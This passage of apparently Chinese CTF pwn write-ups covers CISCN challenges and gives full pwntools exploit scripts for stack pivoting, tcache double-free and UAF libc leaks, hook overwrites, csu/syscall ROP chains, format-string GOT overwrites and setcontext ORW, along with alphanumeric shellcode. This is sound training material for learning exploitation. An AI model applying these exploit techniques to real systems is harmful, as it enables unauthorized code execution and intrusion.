&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;payload1=&#x27;opt:1\\n&#x27;+&#x27;msg:ro0ta\\n&#x27;io.sendlineafter(&quot;&gt;&gt;&gt; &quot;,payload1)payload2 = &#x27;opt:2\\n&#x27;+&#x27;msg:&#x27; + shellcode + &#x27;a\\n&#x27;io.sendlineafter(&quot;&gt;&gt;&gt; &quot;,payload2)io.interactive() ciscn_2019_es_2checksec看一下保护机制 ida打开 主函数应该是vul 跟进看一下 int vul()&#123; char s[40]; // [esp+0h] [ebp-28h] BYREF memset(s, 0, 0x20u); read(0, s, 0x30u); printf(&quot;Hello, %s\\n&quot;, s); read(0, s, 0x30u); return printf(&quot;Hello, %s\\n&quot;, s);&#125; 只能溢出两个字长 只够我们覆盖ebp和ret addr 这种情况下只能考虑栈迁移了 先搞清楚为什么出题人会给两个read吧 栈迁移我们首先需要知道栈帧的地址 而我们知道 一个栈帧在结束的时候 ebp中存储的是父函数的栈底地址 printf函数遇到\\0时就会停止输出 如果我们将s这个数组填满 那么它就会继续输出下一个字长 这样我们就泄露了ebp的内容 payload = b&quot;a&quot;*0x27+b&quot;b&quot; 此时我们使用gdb进行动调 目的是为了得到ebp和我们输入的s的偏移(哪怕开启了pie或者RELRO 由于分页机制的特性 偏移是不变的) 我们将断点打在vul函数的nop汇编的地址 0xa8-0x70 &#x3D; 0x38 于是我们得到 变量s的起始地址为ebp_addr - 0x38 payload = (b&quot;aaaa&quot;+p32(system_addr)+p32(0)+p32(ebp_addr-0x38+0x10)+b&quot;/bin/sh&quot;).ljust(0x28,b&quot;\\x00&quot;)payload += p32(ebp_addr-0x38)+p32(leave_ret) 这里解释一下p32(ebp_addr-0x38+0x10) 我们知道 栈迁移需要一个字长的垃圾数据来平衡栈 此时aaaa的地址为ebp_addr-0x38 &#x2F;bin&#x2F;sh前面的三个字长则占用了0xc字节 所以此时&#x2F;bin&#x2F;sh的位置则位于ebp_addr-0x38+0x10 完整exp: from pwn import*#io = process(&quot;./pwn&quot;)io = remote(&quot;node4.buuoj.cn&quot;,28157)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)io.recvuntil(&quot;Welcome, my friend. What&#x27;s your name?&quot;)payload = b&quot;a&quot;*0x27+b&quot;b&quot;io.send(payload)io.recvuntil(&quot;b&quot;)ebp_addr = u32(io.recv(4))system_addr = 0x8048400binsh_addr = ebp_addr - 0x38+0x10ret_addr = 0x080483a6leave_addr = 0x080484b8 payload = (cyclic(0x4)+p32(system_addr)+p32(0xabcdabcd)+p32(binsh_addr)+b&quot;/bin/sh&quot;).ljust(0x28,b&quot;\\x00&quot;)payload += p32(ebp_addr-0x38)+p32(leave_addr)io.sendline(payload)io.interactive() ciscn-2019-final-3这题没想出来根据堆块地址不断申请到main_arena的chunk 然后泄露基址的思路 记录一下 扩展一下思路 checksec ida反编译 看一下伪代码 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; __int64 v3; // rax int v4; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); sub_C5A(a1, a2, a3); v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;welcome to babyheap&quot;); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); while ( 1 ) &#123; menu(); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;choice &gt; &quot;); std::istream::operator&gt;&gt;(&amp;std::cin, &amp;v4); if ( v4 == 1 ) &#123; add(); &#125; else if ( v4 == 2 ) &#123; delete(); &#125; &#125;&#125; 只给了两个函数 add和delete 其中delete没有置零指针 存在UAF漏洞 add函数在申请完chunk后打印了chunk的用户空间区域首地址 那么此时我们拥有的漏洞只有UAF了 只能利用这个来泄露基址和获取shell 获取shell好说 这题的环境是Ubuntu18 可以打hook 并且tcache的检查机制没有fastbin那么复杂 可以很轻松的利用double free修改fd来申请任意内存空间的chunk 那么难点落在泄露libc基址了 题目没有给我们show函数 但是相比其他堆题给了打印申请chunk的地址的机会 很明显要利用这个来替代show函数 那么此时就可以利用UAF来申请到一块位于libc基址附近内存区域的chunk 那么我们可以联想到如果unsortedbin中的单个链表如果只有一个 free chunk 那么其fd和bk域的值就会是main_arena_addr+padding 此时存放main_arena_addr的地址我们也知道 就可以在tcachebin上窜成一个链表 申请到位于main_arena_addr的堆块 那么此时add函数中的这条代码就可以输出该chunk的用户空间首地址 即泄露了main_arena_addr 我们就可以得到libc基址 from pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,28487)io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()def add(index,size,payload): io.recvuntil(&quot;choice &gt; &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;input the index&quot;) io.sendline(str(index)) io.recvuntil(&quot;input the size&quot;) io.sendline(str(size)) io.recvuntil(&quot;now you can write something&quot;) io.send(payload) io.recvuntil(&quot;gift :&quot;)def delete(index): io.recvuntil(&quot;choice &gt; &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;input the index&quot;) io.sendline(str(index))add(0,0x70,b&#x27;aaaa&#x27;)add(1,0x70,b&#x27;aaaa&#x27;)heap_addr = int(io.recv(14),16)success(hex(heap_addr))for i in range(1,9): add(i+1,0x70,b&#x27;aaaa&#x27;)delete(0)delete(0)add(10,0x70,p64(heap_addr-0x10))add(11,0x70,b&#x27;aaaa&#x27;) 此时 我们double free chunk0 此时的链表结构如下图 按照tcachebins单向链表先进后出的原则 此时我们获得是蓝色的那个free chunk 并且tcachebin显示的链表地址是chunk的用户空间首地址 此时我们将申请的chunk的内容设置为chunk1的首地址 就可以将其作为白色的free chunk的fd域 挂载在链表上 从而我们就可以申请到对应的内存空间 而利用for循环申请的几个chunk 则是为了等下修改chunk1的size域 从而合并后面的chunk空间 获得一个大于tcachebin范围的chunk 这样就能释放到unsortedbin中了 payload = p64(0)+p64(0x481)add(12,0x70,payload)add(13,0x20,b&#x27;aaaa&#x27;)add(14,0x20,b&#x27;aaaa&#x27;)delete(1) 此时覆盖chunk1的size域 并且释放chunk1 chunk13是用来后面的double free chunk14是用来防止和top chunk合并 此时我们就成功往unsortedbin中释放了一个chunk 那么指向main_arena的地址也就是我们上面的heap_addr 我们用同样的办法 再次利用double free任意申请到一个chunk delete(13)delete(13)add(15,0x20,p64(heap_addr)) 但是此时的链表结构显示是不全的 其是根据箭头所指的数据来显示free chunk 使用tel指令可以查看其地址指向 add(16,0x20,b&#x27;aaaa&#x27;)add(17,0x20,b&#x27;bbbb&#x27;)add(18,0x20,b&#x27;aaaa&#x27;)main_arena_addr = int(io.recv(14),16)success(hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f355d756ca0-0x7f355d36b000)success(hex(libc_addr))onegadget_addr = libc_addr + 0x10a38c 此时我们连续申请三个chunk 申请的第三个chunk就会分配到main_arena的空间 就成功泄露了基址 add(19,0x60,b&#x27;aaaa&#x27;)delete(19)delete(19)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]add(20,0x60,p64(malloc_hook))add(21,0x60,b&#x27;aaaa&#x27;)add(22,0x60,p64(onegadget_addr))io.recvuntil(&quot;choice &gt; &quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;input the index&quot;)io.sendline(b&#x27;23&#x27;)io.recvuntil(&quot;input the size&quot;)io.sendline(b&#x27;0x70&#x27;)io.interactive() 最后一步同理 通过同样的double free办法 获取任意写malloc_hook的机会 将其修改为onegadget 再次调用malloc的时候就会触发onegadget 获取shell ciscn-2019-s-3Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 主体函数非常简单 利用系统调用号实现了一次输入和输出 signed __int64 vuln()&#123; signed __int64 v0; // rax char buf[16]; // [rsp+0h] [rbp-10h] BYREF v0 = sys_read(0, buf, 0x400uLL); return sys_write(1u, buf, 0x30uLL);&#125; 还有一个gadget函数 看一下汇编代码 .text:00000000004004D6 ; =============== S U B R O U T I N E =======================================.text:00000000004004D6.text:00000000004004D6 ; Attributes: bp-based frame.text:00000000004004D6.text:00000000004004D6 public gadgets.text:00000000004004D6 gadgets proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6 push rbp.text:00000000004004D7 mov rbp, rsp.text:00000000004004DA mov rax, 0Fh.text:00000000004004E1 retn.text:00000000004004E1 gadgets endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2 ; ---------------------------------------------------------------------------.text:00000000004004E2 mov rax, 3Bh ; &#x27;;&#x27;.text:00000000004004E9 retn.text:00000000004004E9 ; --------------------------------------------------------------------------- 下方的0x3b则为59 是execve的系统调用号 应该是构造rop链 但是这题没有办法泄露libc基址 从而也没有办法获取&#x2F;bin&#x2F;sh的地址 所以只能通过写入栈上 要想利用栈 先得获得栈的地址 发现sys_write函数可以打印出0x30字节 而buf距离rbp只有0x10 还有一点需要注意 发现vuln函数的结尾并没有leave指令 也就是说我们只需要覆盖rbp就可以控制程序执行流 .text:00000000004004ED ; __unwind &#123;.text:00000000004004ED push rbp.text:00000000004004EE mov rbp, rsp.text:00000000004004F1 xor rax, rax.text:00000000004004F4 mov edx, 400h ; count.text:00000000004004F9 lea rsi, [rsp+buf] ; buf.text:00000000004004FE mov rdi, rax ; fd.text:0000000000400501 syscall ; LINUX - sys_read.text:0000000000400503 mov rax, 1.text:000000000040050A mov edx, 30h ; &#x27;0&#x27; ; count.text:000000000040050F lea rsi, [rsp+buf] ; buf.text:0000000000400514 mov rdi, rax ; fd.text:0000000000400517 syscall ; LINUX - sys_write.text:0000000000400519 retn.text:0000000000400519 vuln endp ; sp-analysis failed.text:0000000000400519.text:0000000000400519 ; --------------------------------------------------------------------------- from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))gdb.attach(io)print(hex(stack_addr)) 可以看到泄露出了栈上的地址 但是此时我们并没有办法得知其与写入栈上的&#x2F;bin&#x2F;sh的偏移 这里的原因暂时没有办法得知 先放着这个疑问 下面我们进行系统调用 由于需要用到三个寄存器 所以这里用到csu 具体的流程我就不过多赘述了 rdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)binsh_addr = stack_addr - 0x138payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload) 这里重点解释一下三个方面 1.为什么要多出一个p64(int59_addr)在栈上 这是因为call指令的问题 他跳转的是对应地址中存储的值 我们如果直接跳转到int59_addr是调用失败的 2.binsh_addr和stack_addr的偏移是怎么求出来的 我们将断点打在csu执行到call r12那一行 然后gdb看一下栈 可以计算出偏移为0x138 还有第二种办法可以查看到&#x2F;bin&#x2F;sh位于栈上的地址 stack 24实际上是以rsp往高地址方向 如果我们使rsp的地址减少 就可以做到查看低地址处的栈内容 set $rsp = $rsp-0x150 看到这里你也能够理解我们赋值给r12的binsh_addr+0x10是什么用意了吧 最终exp: from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))binsh_addr = stack_addr - 0x138rdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload)io.interactive() [CISCN 2019华北]PWN1比较简单的一题 看一下保护机制 ida查看一下伪代码 int __cdecl main(int argc, const char **argv, const char **envp)&#123; setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); func(); return 0;&#125; main函数就很简单的清空了缓存区 顺便调用了func函数 跟进一下 int func()&#123; int result; // eax char v1[44]; // [rsp+0h] [rbp-30h] BYREF float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(&quot;Let&#x27;s guess the number.&quot;); gets(v1); if ( v2 == 11.28125 ) result = system(&quot;cat /flag&quot;); else result = puts(&quot;Its value should be 11.28125&quot;); return result;&#125; 考了一手浮点数传参 比较简单 由于这题保护开的比较少 所以也可以直接栈溢出 两种做法都演示一下吧 1.浮点数传参 看一下汇编代码 movss是处理float精度的浮点数指令 这里顺便扩展一下知识点 处理double精度的浮点数用的是movsd 针对不同的字节数 还有movsb movsw ‘b’ ‘w’ ‘d’ 分别对应的一位 一字节 双字节 除此之外还有movzx movsx两兄弟 你可能也遇到过 我们编写如下程序 #include &lt;stdio.h&gt;char a[0x100];int main()&#123; char a = 120; a += 9; printf(&quot;%d&quot;,a);&#125; 预期结果应该是129对吧 但是最后的输出结果却是 这是因为char类型变量只有单字节 也就是只有8位 哪怕是无符号数其范围也只有0-255 符号数范围只有-128-127 显然129就超过了其范围 需要进行扩展 例如利用int型进行一个中转 而movzx和movsx也起到同样的作用 movzx扩展的时候高位全补0 例如0xffff 补全成0x0000ffff movsx扩展的时候根据符号位决定补1还是0 例如0xffff 是负数 那么补1 也就是0xffffffff 话归正题 我们索引一下浮点数应该是dword_4007F4 取其值传参 0x41348000 exp: from pwn import*#io = process(&quot;./pwn&quot;)io = remote(&quot;1.14.71.254&quot;,28934)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Let&#x27;s guess the number.&quot;)payload = cyclic(0x2c)+p32(0x41348000)# gdb.attach(io,&#x27;b *0x4006A2&#x27;)# pause(0)io.sendline(payload)io.recv()io.recv() 2.ret2text 很简单 直接贴exp吧 from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28934)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Let&#x27;s guess the number.&quot;)backdoor_addr = 0x4006BEpayload = cyclic(0x38)+p32(backdoor_addr)# gdb.attach(io,&#x27;b *0x4006A2&#x27;)# pause(0)io.sendline(payload)io.recv()io.recv() [CISCN 2019东北]PWN2比较简单的一题 打ret2text 但是NSS平台上没给libc文件 就用libcsearch来 不过这个也有坑 老版的已经没有维护了 得安装新版本的 新版本的是联网的 Lan1keA&#x2F;LibcSearcher: 🔍 LibcSearcher-ng – get symbols’ offset in glibc. (github.com) 保护机制 我为了方便本地调试把libc依赖更换了 忽视即可 int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+Ch] [rbp-4h] BYREF init(argc, argv, envp); puts(&quot;EEEEEEE hh iii &quot;); puts(&quot;EE mm mm mmmm aa aa cccc hh nn nnn eee &quot;); puts(&quot;EEEEE mmm mm mm aa aaa cc hhhhhh iii nnn nn ee e &quot;); puts(&quot;EE mmm mm mm aa aaa cc hh hh iii nn nn eeeee &quot;); puts(&quot;EEEEEEE mmm mm mm aaa aa ccccc hh hh iii nn nn eeeee &quot;); puts(&quot;====================================================================&quot;); puts(&quot;Welcome to this Encryption machine\\n&quot;); begin(); while ( 1 ) &#123; while ( 1 ) &#123; fflush(0LL); v4 = 0; __isoc99_scanf(&quot;%d&quot;, &amp;v4); getchar(); if ( v4 != 2 ) break; puts(&quot;I think you can do it by yourself&quot;); begin(); &#125; if ( v4 == 3 ) &#123; puts(&quot;Bye!&quot;); return 0; &#125; if ( v4 != 1 ) break; encrypt(); begin(); &#125; puts(&quot;Something Wrong!&quot;); return 0;&#125; begin函数跟进一下 int begin()&#123; puts(&quot;====================================================================&quot;); puts(&quot;1.Encrypt&quot;); puts(&quot;2.Decrypt&quot;); puts(&quot;3.Exit&quot;); return puts(&quot;Input your choice!&quot;);&#125; 只有encrypt函数有点东西 跟进一下 int encrypt()&#123; size_t v0; // rbx char s[48]; // [rsp+0h] [rbp-50h] BYREF __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(&quot;Input your Plaintext to be encrypted&quot;); gets(s); while ( 1 ) &#123; v0 = (unsigned int)x; if ( v0 &gt;= strlen(s) ) break; if ( s[x] &lt;= &#x27;`&#x27; || s[x] &gt; 122 ) &#123; if ( s[x] &lt;= 64 || s[x] &gt; 90 ) &#123; if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 ) s[x] ^= 0xCu; &#125; else &#123; s[x] ^= 0xDu; &#125; &#125; else &#123; s[x] ^= 0xEu; &#125; ++x; &#125; puts(&quot;Ciphertext&quot;); return puts(s);&#125; 对于我们输入的字符串s进行了加密 并且打印出来 不过由于没开canary和pie 又有gets函数 这里直接栈溢出打个ret2text就好了 唯一一点要注意的是就是最后要进行栈对齐 判断方法就是gdb动调一直n下去 卡住的时候如果sp指针末尾是8即需要栈对齐 exp: from pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28610)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Input your choice!&quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;Input your Plaintext to be encrypted&quot;)rdi_addr = 0x0000000000400c83puts_got = elf.got[&#x27;puts&#x27;]puts_sym = 0x4006e0back_addr = 0x400A47start_addr = elf.sym[&#x27;_start&#x27;]payload = cyclic(0x50+0x8)+p64(rdi_addr)+p64(puts_got)+p64(puts_sym)+p64(start_addr)# gdb.attach(io,&#x27;b *0x400AEE&#x27;)# pause(0)io.sendline(payload)io.recv()io.recvuntil(&quot;\\x7f&quot;)ret_addr = 0x00000000004006b9puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;puts_addr :&quot;+hex(puts_addr))obj = LibcSearcher(&quot;puts&quot;,puts_addr)libc_addr = puts_addr - obj.dump(&quot;puts&quot;)success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + obj.dump(&quot;system&quot;)binsh_addr = libc_addr + obj.dump(&quot;str_bin_sh&quot;)io.recvuntil(&quot;Input your choice!&quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;Input your Plaintext to be encrypted&quot;)payload = cyclic(0x58)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.sendline(payload)io.interactive() [CISCN 2019东南]PWN2看一下保护机制 ida看一下伪代码 int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(); puts(&quot;Welcome, my friend. What&#x27;s your name?&quot;); vul(); return 0;&#125; 分别跟进一下init函数和vul函数 init函数就是清空了缓存区 int init()&#123; setvbuf(stdin, 0, 2, 0); return setvbuf(stdout, 0, 2, 0);&#125; vul函数相当于主函数 分析一下 int vul()&#123; char s[40]; // [esp+0h] [ebp-28h] BYREF memset(s, 0, 0x20u); read(0, s, 0x30u); printf(&quot;Hello, %s\\n&quot;, s); read(0, s, 0x30u); return printf(&quot;Hello, %s\\n&quot;, s);&#125; 给了两次read的机会 rsi都是栈上的s 同时输入完了以后还进行了printf操作 没有开启canary和pie 存在栈溢出 栈溢出只有两个字长的距离 只够覆盖ebp和ret addr 猜测一手栈迁移 但是目前没有bss段的地址可写 也没有给栈上的地址 既然这样那我们就自己泄露吧 gdb动调一下 断点打在printf函数调用的时候 这里我选择的是ebp处存放的栈地址 printf函数遇到\\0就会截停 所以我们只需要用垃圾数据覆盖esp到ebp之间的空间 就可以让printf函数一路畅通无阻 泄露出其内容 from pwn import*from LibcSearcher import*#io = process(&quot;./pwn&quot;)io = remote(&quot;1.14.71.254&quot;,28294)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Welcome, my friend. What&#x27;s your name?&quot;)payload = cyclic(0x28)io.send(payload)stack_addr = u32(io.recvuntil(&quot;\\xff&quot;)[-4:])success(&quot;stack_addr :&quot;+hex(stack_addr)) 随后就是栈迁移的部分了 gdb动调看一下我们第二次输入的s字符串的起始地址和泄露出来的栈地址偏移是多少 顺便在计算一下我们手动放入的binsh字符串的地址 最后利用题目已经给过的system函数构造rop链 获取shell 完整exp: from pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28294)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Welcome, my friend. What&#x27;s your name?&quot;)payload = cyclic(0x28)io.send(payload)stack_addr = u32(io.recvuntil(&quot;\\xff&quot;)[-4:])success(&quot;stack_addr :&quot;+hex(stack_addr))system_addr = 0x8048400s_addr = stack_addr - (0xff976728-0xff9766f0)binsh_addr = s_addr + 0xcleave_addr = 0x080484b8payload = p32(system_addr)+p32(0)+p32(binsh_addr)+b&#x27;/bin/sh;&#x27;payload = payload.ljust(0x28)+p32(s_addr-0x4)+p32(leave_addr)# gdb.attach(io,&#x27;b *0x80485FE&#x27;)# pause(0)io.send(payload)io.interactive() [CISCN 2019西南]PWN1解析放到栈分类的手写格式化字符串漏洞中了 下面直接放exp from pwn import*from LibcSearcher import*#io = process(&quot;./pwn&quot;)io = remote(&quot;1.14.71.254&quot;,28417)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;i386&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()fini_addr = 0x804979Cmain_addr = 0x8048534printf_got = 0x804989csystem_addr = 0x80483d0io.recvuntil(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)payload = b&#x27;%&#x27;+str(0x0804).encode()+b&#x27;c%15$hn&#x27;payload += b&#x27;%16$hn&#x27;payload += b&#x27;%&#x27;+str(0x83d0-0x0804).encode()+b&#x27;c%17$hn&#x27;payload += b&#x27;%&#x27;+str(0x8534-0x83d0).encode()+b&#x27;c%18$hnaa&#x27;payload += p32(fini_addr+2)payload += p32(printf_got+2)payload += p32(printf_got)payload += p32(fini_addr)print(len(payload))io.sendline(payload)io.recvuntil(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)payload = b&#x27;/bin/sh&#x27;io.sendline(payload)io.interactive() [CISCN 2021 初赛]silverwolf这题不是很难 但是难点在于多个知识点的结合 在复现的时候也是学习到了许多新知识 下面详细复现一遍 保护全开 同时libc文件是比较少见的2.27 1.3的小版本 这个版本也和目前最新的1.6版本一样 对于tcache有了新的检查机制 ida看一下几个函数 void __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 v3[5]; // [rsp+0h] [rbp-28h] BYREF v3[1] = __readfsqword(0x28u); sub_C70(); while ( 1 ) &#123; puts(&quot;1. allocate&quot;); puts(&quot;2. edit&quot;); puts(&quot;3. show&quot;); puts(&quot;4. delete&quot;); puts(&quot;5. exit&quot;); __printf_chk(1LL, &quot;Your choice: &quot;); __isoc99_scanf(&amp;unk_1144, v3); switch ( v3[0] ) &#123; case 1LL: add(); break; case 2LL: edit(); break; case 3LL: show(); break; case 4LL: delete(); break; case 5LL: exit(0); default: puts(&quot;Unknown&quot;); break; &#125; &#125;&#125; 乍看一下漏洞给的挺多 好像是很简单的堆模板题 但是还开启了沙盒 那显然是无法获取shell了 那就只能想办法构造rop链 同时仔细观察一下 你还会发现 其用来存储chunk指针的不是数组而是单子长的一个指针 这就意味着我们只能操控最新申请的一个chunk 我们拥有的漏洞点包含 UAF off_by_null 既然给了show函数 那么这时候想要泄露基址 还是通过Unsortedbin 不过由于对于申请chunk大小的限制 同时还有指针问题 所以这里要想把chunk丢到unsortedbin中只能通过篡改tcache_perthread_struct来实现目的了 另外 还有一个问题 由于开启了沙盒 沙盒的调用本身也是需要内存空间的 所以程序会自带一些chunk 不过这些chunk对于我们的利用不会起到太大的影响 在做题的过程中小心一下即可 为了劫持tcache_perthread_struct 我们首要的目的就是泄露堆地址 既然有UAF 那么我这里选择的办法是double free 然后泄露fd的值 计算堆基址 add(0,0x28)delete(0)edit(0,p64(0)*2)delete(0)add(0,0x28)show(0)heap_addr = (u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;)) &gt;&gt; 12) * (0x1000)-0x1000success(&quot;heap_addr :&quot;+hex(heap_addr)) 接下来顺带利用好这个double free 来申请到tcache_perthread_struct的地址 然后更改一下counts数组 edit(0,p64(heap_addr+0x10))add(0,0x28)add(0,0x28)edit(0,p64(0)*4+p64(0x7000000)) 这里的*p64(0)4+p64(0x7000000)) 我还是提一嘴 这样修改counts 你会发现被改为7的是0x250链表的位置 之所以是0x250 是因为实际上此时的指针指向的chunk 虽然我们是通过0x28申请到的chunk 但是chunk头的0x251并没有被改写 接下来就是释放chunk进unsortedbin 随后获得一些下面要用到的地址 delete(0)show(0)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f98511ebca0-0x7f9850e00000)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]setcontext = libc_addr + libc.sym[&#x27;setcontext&#x27;] + 53 setcontext就是我们接下来要构造orw的关键好戏了 你可以在libc文件中找到这一函数 可以看到函数对各种寄存器的值都进行了操作 并且还有一次push rcx的入栈操作 特别是 .text:00000000000521B5 mov rsp, [rdi+0A0h] 对于rsp寄存器的劫持可以使得我们在堆上构造rop链 随后迁移过去 因为其赋值是根据rdi来的 rdi寄存器的值要怎么由我们操控呢? 当然是free函数了 进行一个小实验 编写如下程序 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;int main()&#123; char *a[50]; *a = malloc(0x20); free(*a); puts(&quot;test&quot;);&#125; 可以看到此时执行free函数时 rdi寄存器指向的就是chunk的地址 控制rdi寄存器的办法有了 接下来来安排下tcache_perthread_struct的布置问题 我们需要修改entry数组 来得到多次任意地址申请的机会 在开始布置之前 我们需要先获得能修改到其的机会 由于我们最开始使用的是0x28字节的chunk 显然是不够修改到entry数组的长度 我们挑选一个还没有存放chunk的tcachebin链表 会向unsortedbin中申请 所以此时申请到的地址还是tcache_perthread_struct中 add(0,0x48)edit(0,p64(0)*8+p64(heap_addr+0x50)) 于是我们获得了修改entry数组的机会 我们将0x20链表的修改为heap_addr+0x50 这个地址指向的就是entry数组的首地址 随后我们利用这个机会 修改0x40链表的entry 这样就可以修改到更大链表的机会 add(0,0x18)edit(0,p64(0)*2+p64(heap_addr+0x50)) add(0,0x38)payload = p64(free_hook)+p64(heap_addr+0x1000)+p64(heap_addr+0x1000+0xa0) #0x20 0x30 0x40payload += p64(heap_addr+0x1000)+p64(heap_addr+0x2000)+p64(0)+p64(heap_addr+0x2000+0x58) #0x50 0x60 0x70 0x80edit(0,payload) 这里的entry构造就要详细讲讲了 我们需要把rop链写到堆上 不过由于对申请堆块的限制 所以就只能分两次写 对应着0x60和0x80的链表 0x20的链表则用来修改free_hook 使其指向setcontext+53的地址 0x30和0x40的链表我们要用来配合劫持rsp指针 使其迁移到堆上的rop链 0x50的链表则是用来触发free 充当rdi寄存器值 0x70没有作用 ret_addr = libc_addr + 0x00000000000008aardi_addr = libc_addr + 0x000000000002164frsi_addr = libc_addr + 0x0000000000023a6ardx_addr = libc_addr + 0x0000000000001b96rax_addr 